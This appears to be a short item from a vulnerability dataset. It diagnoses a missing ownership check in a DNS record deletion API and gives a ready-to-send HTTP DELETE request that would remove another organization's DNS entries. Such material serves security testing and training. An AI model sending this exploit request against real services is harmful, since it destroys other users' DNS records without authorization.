diagnosis: The DNS record deletion handler validates that both zoneId and recordId are syntactically valid UUIDs using express-validator, but executes the delete query without verifying that the DNS zone belongs to the caller's organization, allowing arbitrary deletion of other users' DNS entries.
exploit_request:
DELETE /api/v2/dns/zones/9812aef0-1120-41bc-9931-df10a9018123/records/110293ac-4411-44ab-8910-fe9910129481 HTTP/1.1
Host: dns.cloudprovider.net:6003
Authorization: Bearer <client_dev_token>
